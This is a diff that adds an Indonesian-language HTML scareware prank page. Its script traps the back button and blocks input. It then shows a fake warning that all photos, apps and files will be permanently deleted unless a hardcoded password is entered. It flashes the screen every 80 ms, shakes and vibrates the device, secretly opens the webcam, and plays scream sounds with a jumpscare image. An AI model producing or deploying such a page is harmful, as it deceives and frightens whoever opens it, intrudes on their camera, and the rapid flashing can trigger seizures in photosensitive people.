@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>⚠️ DISERANG VIRUS</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      margin: 0; padding: 0;
+      background: black;
+      overflow: hidden;
+      height: 100%;
+      font-family: monospace;
+      user-select: none;
+      touch-action: none;
+    }
+    #block {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: black;
+      z-index: 9999;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      color: red;
+      text-align: center;
+      padding: 20px;
+    }
+    .glitch {
+      font-size: 20px;
+      animation: glitch 1s infinite;
+      color: white;
+    }
+    @keyframes glitch {
+      0% { transform: translate(2px, 2px); }
+      25% { transform: translate(-2px, -1px); }
+      50% { transform: translate(-4px, 2px); }
+      75% { transform: translate(4px, 3px); }
+      100% { transform: translate(0, 0); }
+    }
+    #unlock {
+      margin-top: 20px;
+      color: lime;
+      font-size: 18px;
+      display: none;
+    }
+    #passwordBox {
+      margin-top: 30px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      z-index: 10000;
+    }
+    #passwordInput {
+      padding: 8px 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      outline: none;
+    }
+    #submitBtn {
+      margin-top: 10px;
+      padding: 6px 20px;
+      font-size: 14px;
+      cursor: pointer;
+      background: #444;
+      color: white;
+      border: none;
+      border-radius: 4px;
+    }
+    #flash, #jumpscare {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      z-index: 10000;
+    }
+    #flash {
+      background: white;
+      opacity: 0;
+      pointer-events: none;
+    }
+    #jumpscare {
+      background: black;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 10001;
+    }
+    #jumpscare img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+    #camera {
+      position: fixed;
+      bottom: 0;
+      right: 0;
+      width: 150px;
+      height: 100px;
+      z-index: 10002;
+      border: 2px solid red;
+      display: none;
+    }
+  </style>
+</head>
+<body oncontextmenu="return false">
+
+  <div id="block">
+    <div id="glitchText" class="glitch" style="display:none">
+      ⚠️ SISTEM TELAH DISERANG!<br>
+      SEMUA FOTO, APK, FILE AKAN DIHAPUS SECARA PERMANEN!<br><br>
+      💾 MASUKKAN PASSWORD UNTUK MENGHENTIKAN
+    </div>
+    <div id="unlock">✅ Sistem diamankan. Serangan dihentikan.</div>
+    <div id="passwordBox">
+      <input type="password" id="passwordInput" placeholder="Masukkan Password...">
+      <button id="submitBtn">Kirim</button>
+    </div>
+  </div>
+
+  <video id="camera" autoplay muted></video>
+  <div id="flash"></div>
+  <div id="jumpscare">
+    <img src="https://i.ibb.co/vq1pT2f/scaryface.jpg" alt="SCREAM">
+  </div>
+
+  <!-- Suara -->
+  <audio id="laughSound" src="https://www.myinstants.com/media/sounds/evil-laugh.mp3" preload="auto"></audio>
+  <audio id="screamSound" src="https://www.myinstants.com/media/sounds/screamer.mp3" preload="auto"></audio>
+  <audio id="deleteSound" src="https://www.myinstants.com/media/sounds/windows-xp-error.mp3" preload="auto"></audio>
+
+  <script>
+    // Lock tombol back
+    for (let i = 0; i < 20; i++) history.pushState({}, '', location.href);
+    window.onpopstate = () => history.pushState({}, '', location.href);
+
+    // Blok semua input kecuali password
+    const isInsidePasswordBox = el => document.getElementById('passwordBox').contains(el);
+    const blockEvent = e => {
+      if (!isInsidePasswordBox(e.target)) {
+        e.stopPropagation(); e.preventDefault();
+      }
+    };
+    const lockInput = () => {
+      ['click', 'touchstart', 'mousedown', 'keydown'].forEach(event => {
+        document.body.addEventListener(event, blockEvent, true);
+      });
+    };
+    const unlockInput = () => {
+      ['click', 'touchstart', 'mousedown', 'keydown'].forEach(event => {
+        document.body.removeEventListener(event, blockEvent, true);
+      });
+    };
+    lockInput();
+
+    function startFlash() {
+      const flash = document.getElementById("flash");
+      let visible = false;
+      setInterval(() => {
+        flash.style.opacity = visible ? "0" : "1";
+        visible = !visible;
+      }, 80);
+    }
+
+    function shakeScreen() {
+      setInterval(() => {
+        document.body.style.marginLeft = (Math.random() * 10 - 5) + 'px';
+        document.body.style.marginTop = (Math.random() * 10 - 5) + 'px';
+        navigator.vibrate?.(300);
+      }, 100);
+    }
+
+    function openCamera() {
+      const video = document.getElementById("camera");
+      video.style.display = "block";
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => video.srcObject = stream)
+        .catch(e => console.warn("Kamera gagal dibuka", e));
+    }
+
+    function showJumpscare() {
+      const js = document.getElementById("jumpscare");
+      js.style.display = "flex";
+      document.getElementById("screamSound").play();
+      setTimeout(() => js.style.display = "none", 2000);
+    }
+
+    setTimeout(() => {
+      document.getElementById("glitchText").style.display = "block";
+      document.getElementById("laughSound").play();
+      document.getElementById("deleteSound").play();
+      startFlash();
+      shakeScreen();
+      openCamera();
+    }, 2000);
+
+    setTimeout(showJumpscare, 5000);
+
+    function unlockNow() {
+      unlockInput();
+      document.getElementById("unlock").style.display = "block";
+      document.getElementById("passwordBox").style.display = "none";
+      document.getElementById("flash").style.display = "none";
+    }
+
+    setTimeout(unlockNow, 120000);
+
+    document.getElementById("submitBtn").onclick = () => {
+      const val = document.getElementById("passwordInput").value;
+      if (val === "adithengker") {
+        unlockNow();
+      } else {
+        alert("❌ Password salah! Serangan terus berlanjut!");
+      }
+    };
+  </script>
+</body>
+  </html>
+  
